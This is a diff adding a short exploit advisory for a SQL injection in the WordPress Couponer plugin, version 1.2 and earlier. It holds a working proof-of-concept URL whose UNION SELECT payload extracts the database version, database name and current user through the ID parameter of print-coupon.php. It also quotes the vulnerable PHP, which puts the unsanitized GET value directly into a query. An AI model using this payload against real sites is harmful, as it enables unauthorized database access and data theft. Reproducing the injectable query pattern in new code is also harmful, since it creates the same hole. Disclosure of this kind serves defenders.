@@ -1,0 +1,19 @@
+# Exploit Title: WordPress Couponer plugin <= 1.2 SQL Injection Vulnerability
+# Date: 2011-08-31
+# Author: Miroslav Stampar (miroslav.stampar(at)gmail.com @stamparm)
+# Software Link: http://downloads.wordpress.org/plugin/couponer.zip
+# Version: 1.2 (tested)
+# Note: magic_quotes has to be turned off
+
+---
+PoC
+---
+http://www.site.com/wp-content/plugins/couponer/print-coupon.php?ID=-1' UNION ALL SELECT 1,version(),database(),current_user(),5,6,7,8,9,10--%20
+
+---------------
+Vulnerable code
+---------------
+$ID = $_GET['ID'];
+...
+$sql_get_coupon_id = "SELECT *, DATE_FORMAT(Expires, '%b %e, %Y') as Expires, DATE_FORMAT(Created, '%b %e, %Y') as Created FROM wp_couponer WHERE ID='$ID'";
+$result_get_coupon_id = mysql_query($sql_get_coupon_id);
